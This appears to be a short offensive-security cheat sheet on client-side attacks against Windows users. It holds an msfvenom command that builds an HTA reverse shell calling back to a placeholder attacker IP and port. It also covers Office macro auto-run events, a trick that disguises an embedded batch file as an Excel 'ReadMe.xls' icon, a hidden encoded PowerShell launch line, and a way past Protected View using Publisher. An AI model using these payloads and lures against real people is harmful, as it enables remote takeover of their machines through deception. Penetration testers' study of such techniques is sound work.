# Client Side

---

- [Client Fingerprinting](#client-fingerprinting)
- [Internet Explorer Legacy Shell (HTA)](#internet-explorer-hta)
- [Microsoft Office](#microsoft-office)
- [Object Linking And Embedding](#object-linking-and-embedding)
- [Evading Protected View](#evading-protected-view)

<a name="client-fingerprinting"></a>
## Client Fingerprinting
Getting a target to visit your website can allow you to collect information about the client.
- [fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs2)

<a name="internet-explorer-hta"></a>
## Internet Explorer Legacy Shell (HTA)
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=__ATTACKER_IP__ LPORT=__ATTACKER_PORT__ -f hta-psh -o reverse.hta
```

<a name="microsoft-office"></a>
## Microsoft Office
Extension must be .doc or .docm. VBA has 255 string character limit so needs splitting.  
Macros are not executed automatically, therefore we can use the events “AutoOpen” and “Document_Open”

<a name="object-linking-and-embedding"></a>
## Object Linking And Embedding
Abuses Dynamic Data Exchange (DDE). - Patched December 2017  
Leverage Object Linking and Embedding (OLE) to abuse document-embedding feature.

Insert -> Object -> Create From File -> Select Batch script  
Check Display as icon, Change icon and text to something that can entire user, such as Excel with “ReadMe.xls”  
(eg Icon: C:\Program Files\Microsoft Office\root\Office16\EXCEL.exe)

User must double click it and accept security warning for it to run.

Create batch file (eg)
```sql
START powershell.exe -nop -w hidden -e aQBmACgAWwBJ....ACgAJABzACkAOwA=
```

<a name="evading-protected-view"></a>
## Evading Protected View
Instead of using word, you can use publisher or similar which do not implement protected view.
